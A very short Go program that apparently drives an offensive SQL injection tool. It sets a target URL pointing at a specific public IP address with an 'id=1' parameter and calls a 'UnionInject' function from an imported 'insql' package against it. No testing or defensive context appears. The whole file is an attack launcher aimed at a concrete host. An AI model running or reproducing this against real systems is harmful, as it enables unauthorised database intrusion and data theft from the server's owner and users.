package main

import "github.com/jingyi/insql/pkg"

func Insql() {
	host := "http://47.108.225.199:8080/?id=1"
	pkg.UnionInject(host)
}
